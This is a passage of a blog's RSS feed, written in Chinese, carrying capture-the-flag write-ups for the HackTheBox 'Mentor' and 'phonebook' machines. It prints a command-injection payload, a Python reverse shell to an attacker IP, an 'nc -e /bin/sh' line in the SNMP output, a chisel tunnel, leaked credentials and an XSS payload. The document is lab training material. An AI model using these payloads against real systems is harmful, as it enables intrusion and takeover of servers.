+HOST-RESOURCES-MIB::hrSWRunParameters.1242 = STRING: &quot;-o -p -- \\u --noclear tty1 linux&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1243 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1254 = STRING: &quot;-k start&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1340 = STRING: &quot;-H fd:// --containerd=/run/containerd/containerd.sock&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1691 = STRING: &quot;/usr/local/bin/login.sh&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1742 = STRING: &quot;-proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1755 = STRING: &quot;-namespace moby -id 96e44c5692920491cdb954f3d352b3532a88425979cd48b3959b63bfec98a6f4 -address /run/containerd/containerd.sock&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1781 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1838 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1839 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1840 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1841 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1842 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1843 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1849 = STRING: &quot;-proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1863 = STRING: &quot;-namespace moby -id 556e8c834293dd86447407ed131913827ab286e6c16eb2629ef5567c3beec9ba -address /run/containerd/containerd.sock&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1889 = STRING: &quot;-m uvicorn app.main:app --reload --workers 2 --host 0.0.0.0 --port 8000&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1958 = STRING: &quot;-proto tcp -host-ip 172.22.0.1 -host-port 81 -container-ip 172.22.0.2 -container-port 80&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1971 = STRING: &quot;-namespace moby -id 9fe6db6386def9ee85a401e564be071bc55984fa0962d8748de5e8d6b1076a30 -address /run/containerd/containerd.sock&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.1993 = STRING: &quot;main.py&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.2007 = STRING: &quot;-c from multiprocessing.semaphore_tracker import main;main(4)&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.2008 = STRING: &quot;-c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.2092 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.2110 = STRING: &quot;/usr/local/bin/login.py kj23sadkj123as0-d213&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.26610 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.26614 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.91129 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.91137 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.91143 = STRING: &quot;-c tar -c -f $(nc 10.10.14.89 9001 -e /bin/sh)/app_backkup.tar /app/ &amp;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.91144 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.91148 = STRING: &quot;-c import pty;pty.spawn(\&quot;/bin/sh\&quot;)&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.91149 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.91419 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.91862 = &quot;&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.91958 = STRING: &quot;-k start&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.91959 = STRING: &quot;-k start&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.92142 = &quot;&quot;
+</code></pre>
+<p>其中，这里有一个地方有些意思</p>
+<p><code>: &quot;/usr/local/bin/login.py kj23sadkj123as0-d213&quot;</code></p>
+<h3>Login as james</h3>
+<p>这里本来试着用 <code>admin@mentorquotes.htb</code> 结果发现不行，看了提示才知道是docs最上面还泄漏了james的邮箱（ <code>james@mentorquotes.htb</code> )</p>
+<p>使用james身份登录</p>
+<p><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303156.png" alt="Untitled"></p>
+<p>然后将刚刚docs下的api接口的Authorization都替换为james的，users有返回：</p>
+<pre><code>{&quot;id&quot;:1,&quot;email&quot;:&quot;james@mentorquotes.htb&quot;,&quot;username&quot;:&quot;james&quot;},{&quot;id&quot;:2,&quot;email&quot;:&quot;svc@mentorquotes.htb&quot;,&quot;username&quot;:&quot;service_acc&quot;}
+
+</code></pre>
+<p>还有就是能用 <code>/quotes</code> 接口，往里新增之类的</p>
+<p>另外 <code>/admin</code>  也可以用啦</p>
+<p><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303157.png" alt="Untitled"></p>
+<h2>SNMP - public</h2>
+<p>刚刚的命令是获取snmp下 <code>private</code> 的部分，还有 <code>public</code> 的部分尝试获取：</p>
+<pre><code class="language-bash">~ snmpbulkwalk -v2c -c public 10.10.11.193                                                                                                                                       0 [11:48:10]
+SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
+SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
+DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (6269914) 17:24:59.14
+SNMPv2-MIB::sysContact.0 = STRING: Me &lt;admin@mentorquotes.htb&gt;
+SNMPv2-MIB::sysName.0 = STRING: mentor
+SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
+SNMPv2-MIB::sysServices.0 = INTEGER: 72
+SNMPv2-MIB::sysORLastChange.0 = Timeticks: (6) 0:00:00.06
+SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
+SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
+SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
+SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
+SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
+SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
+SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
+SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
+SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
+SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
+SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
+SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
+SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
+SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
+SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
+SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
+SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
+SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
+SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
+SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
+
+HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (6273398) 17:25:33.98
+HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2023-3-15,3:56:37.0,+0:0
+HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
+HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: &quot;BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
+&quot;
+HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
+HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 235
+HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
+HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
+</code></pre>
+<h2>/admin</h2>
+<p>可以看到，现在用james的身份，/admin 返回</p>
+<pre><code>{&quot;admin_funcs&quot;:{&quot;check db connection&quot;:&quot;/check&quot;,&quot;backup the application&quot;:&quot;/backup&quot;}}
+</code></pre>
+<p>测试 /admin/check， 返回： {&quot;details&quot;:&quot;Not implemented yet!&quot;}</p>
+<p>然后测试 /admin/backup，根据response一点点构造</p>
+<p><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303158.png" alt="Untitled"></p>
+<h3>command injection</h3>
+<p>从API生成backup，考虑到有可能将传入的path作为command的参数，然后执行命令</p>
+<p>测试如下命令：</p>
+<pre><code>{
+		&quot;path&quot;: &quot;test; wget  http://10.10.14.32 ;&quot;
+}
+</code></pre>
+<p>本地收到</p>
+<p><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303159.png" alt="Untitled"></p>
+<h2>User flag</h2>
+<p>参考：<a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a> 下的reverse shell cheat sheet</p>
+<p>用bash没有成功，用python的（因为网站基于python的web框架）</p>
+<pre><code>{
+		&quot;path&quot;: &quot;test;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.14.32\&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);' &quot;
+}
+</code></pre>
+<p>然后是upgrade shell  <code>^Z</code>  后，输入</p>
+<pre><code>stty raw -echo; fg
+</code></pre>
+<p>到用户 $HOME目录下，获取user.flag</p>
+<h2>root flag</h2>
+<p>在 <code>/app</code> 目录下查看Dockerfile，当前网站是在容器内运行。</p>
+<p>Dockerfile的内容如下：</p>
+<pre><code class="language-docker">FROM python:3.6.9-alpine
+
+RUN apk --update --upgrade add --no-cache  gcc musl-dev jpeg-dev zlib-dev libffi-dev cairo-dev pango-dev gdk-pixbuf-dev
+
+WORKDIR /app
+ENV HOME /home/svc
+ENV PATH /home/svc/.local/bin:${PATH}
+RUN python -m pip install --upgrade pip --user svc
+COPY requirements.txt requirements.txt
+RUN pip install -r requirements.txt
+RUN pip install pydantic[email] pyjwt
+EXPOSE 8000
+COPY . .
+CMD [&quot;python3&quot;, &quot;-m&quot;, &quot;uvicorn&quot;, &quot;app.main:app&quot;, &quot;--reload&quot;, &quot;--workers&quot;, &quot;100&quot;, &quot;--host&quot;, &quot;0.0.0.0&quot;, &quot;--port&quot; ,&quot;8000&quot;]
+</code></pre>
+<p>在 <code>/app/app</code> 下，有有关这个网站的全部py代码，config.py是空，但是db.py有（地址是docker的地址）</p>
+<pre><code class="language-docker">DATABASE_URL = os.getenv(&quot;DATABASE_URL&quot;, &quot;postgresql://postgres:postgres@172.22.0.1/mentorquotes_db&quot;)
+</code></pre>
+<p>想到之前在推看到的文章： <a href="https://dmesg.app/ufw-vs-docker.html">https://dmesg.app/ufw-vs-docker.html</a></p>
+<p><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/2023031510.png" alt="Untitled"></p>
+<p>我对这块不太熟悉，所以还是看了大佬的writeup的思路过程。</p>
+<p>用<a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a> 的开源</p>
+<p>攻击机：</p>
+<pre><code class="language-docker">./chisel_1.8.1_linux_amd64 server -p 8000 --reverse
+</code></pre>
+<p>container：</p>
+<p>用 Chisel 工具建立一个反向隧道（8000端口），将本地客户端的 5432 端口映射到远程服务器 172.22.0.1 的 5432 端口。</p>
+<pre><code class="language-docker">./chisel_1.8.1_linux_amd64 client 10.10.14.32:8000 R:5432:172.22.0.1:5432
+</code></pre>
+<h3>connect to database</h3>
+<p>命令</p>
+<pre><code class="language-docker">psql -h 127.0.0.1 -p 5432 -U postgres
+</code></pre>
+<p>密码也是postgres。输入 <code>\list</code> 查看全部database，发现 mentorquotes_db</p>
+<ol>
+<li><code>\connect mentorquotes_db</code>  连接到数据库</li>
+<li><code>\dt</code></li>
+</ol>
+<pre><code class="language-docker">mentorquotes_db=# \dt
+          List of relations
+ Schema |   Name   | Type  |  Owner   
+--------+----------+-------+----------
+ public | cmd_exec | table | postgres
+ public | quotes   | table | postgres
+ public | users    | table | postgres 
+</code></pre>
+<ol>
+<li><code>select * from xxx</code></li>
+</ol>
+<pre><code class="language-docker">mentorquotes_db=# select * from users;
+id |         email          |  username   |             password             
+----+------------------------+-------------+----------------------------------
+  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
+  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
+</code></pre>
+<p>还有一种方法是直接该models，加个password的字段。这样访问api的/users会返回密码</p>
+<p>密码是 ： svc@mentorquotes.htb  /  <code>123meunomeeivani</code></p>
+<h3>提权</h3>
+<p>查看 <code>/etc/snmp</code> 目录，用以下命令去查看相关的snmp配置（去除掉注释）</p>
+<pre><code class="language-docker">/etc/snmp$ cat snmpd.conf | grep -v &quot;^#&quot; | grep .
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/2023031511.png" alt="Untitled"></p>
+<p>密码是： <code>SuperSecurePassword123__</code></p>
+<p>登录后 <code>sudo -l</code> 查看权限</p>
+<pre><code class="language-docker">sudo /bin/sh
+</code></pre>
+<h2>Reference</h2>
+<ul>
+<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug</a></li>
+<li><a href="https://www.daehee.com/werkzeug-console-pin-exploit/">https://www.daehee.com/werkzeug-console-pin-exploit/</a></li>
+<li><a href="https://0xdf.gitlab.io/2023/03/11/htb-mentor.html">https://0xdf.gitlab.io/2023/03/11/htb-mentor.html</a></li>
+</ul>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+        <item>
+            <title><![CDATA[[HTB]phonebook | writeup]]></title>
+            <link>https://1dayluo.github.io/posts/history/htbphonebook-or-writeup</link>
+            <guid>https://1dayluo.github.io/posts/history/htbphonebook-or-writeup</guid>
+            <pubDate>Sun, 14 Jun 2026 16:18:01 GMT</pubDate>
+            <content:encoded><![CDATA[<p>输入错误的用户名和密码,发现提示权限失败的message是通过url传输的,构造payload引起alert的弹窗</p>
+<p>payload : <a href="http://178.62.5.61:31279/login?message=%3Cimg%20src=1%20onerror=alert(123)%3E"><code>http://178.62.5.61:31279/login?message=&lt;img src=1 onerror=alert(123)&gt;</code></a></p>
+<p>但是还是需要登陆的,在登陆页面输入wildcards的'<em>'(用户名和密码均是).因为没有前面的过滤,直接把</em>传递到后台,所以就能登陆进去了.</p>
+<p>进行code review.发现请求了一个/search 的api,如果成功,就显示search后的结果(以table的方式)</p>
+]]></content:encoded>
+            <author>i@valaxy.site (1dayluo)</author>
+        </item>
+    </channel>
+</rss>
